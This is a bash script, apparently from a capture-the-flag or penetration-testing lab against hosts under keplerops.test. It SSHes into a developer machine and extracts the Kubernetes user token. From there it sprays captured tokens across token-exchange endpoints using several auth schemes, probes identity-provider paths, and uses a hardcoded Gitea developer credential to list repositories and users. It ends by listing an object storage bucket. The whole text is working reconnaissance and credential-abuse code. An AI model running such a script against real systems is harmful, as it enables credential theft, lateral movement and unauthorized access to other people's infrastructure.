set +e
ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 rowan-dev 'bash -s' <<'RSH'
set +e
W="FLAG{6bb66074f2325405}"
W2="FLAG{adfbabdcdaca98ac}"
JWT=$(kubectl config view --raw -o jsonpath='{.users[0].user.token}')
t(){ echo "-- $1"; shift; curl -sSk -m 7 -o /tmp/o -w ' [%{http_code}]' "$@" ; echo " :: $(head -c 400 /tmp/o | tr '\n' ' ')"; }
echo "=== HOSTS FILE ==="
cat /etc/hosts
echo "=== WORKSPACE TOKEN MATRIX across hosts ==="
for H in cloud-api workloads workload data identity id; do
 for U in /api/workspaces/current/token-exchange /api/workspace/current/token-exchange /api/token-exchange; do
  echo "### $H$U"
  t "GET wsheader" -H "X-Workspace-Token: $W" "https://$H.keplerops.test$U"
  t "POST wsheader body all" -X POST -H "X-Workspace-Token: $W" -H 'Content-Type: application/json' -d "{\"workspace_token\":\"$W\",\"export_id\":\"EXP-2841\",\"handover\":\"EXP-2841\"}" "https://$H.keplerops.test$U"
  t "POST bearer" -X POST -H "Authorization: Bearer $W" -H 'Content-Type: application/json' -d '{}' "https://$H.keplerops.test$U"
  t "POST basic" -X POST -u "rowan.ito:$W" -H 'Content-Type: application/json' -d '{}' "https://$H.keplerops.test$U"
 done
done
echo "=== IDENTITY PROBES ==="
for p in / /admin/ /api /api/config /realms /auth/realms /realms/fieldlink /realms/fieldlink/.well-known/openid-configuration /.well-known/openid-configuration /protocol/openid-connect/token /auth/realms/fieldlink/protocol/openid-connect/token /login /api/auth /api/session /whoami /api/whoami /health /api/health; do
 t "id$p" "https://identity.keplerops.test$p"
done
echo "=== ID = same ==="
t "id /admin/" "https://id.keplerops.test/admin/"
echo "=== GITEA ORG REPOS ==="
API="https://source.keplerops.test/api/v1"
A="rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo"
t "org repos" -u "$A" "$API/orgs/fieldkest/repos?limit=50"
t "admin repos" -u "$A" "$API/repos/search?limit=50&q="
t "users" -u "$A" "$API/users/search?limit=20"
echo "=== OBJECTS FULL LIST ==="
curl -sSk -m 10 "https://objects.keplerops.test/fieldkest-workspaces/?list-type=2" | tr '<' '\n<' | grep -E '^Key>|^Size>' | head -60
RSH
echo DONE_K14_R18
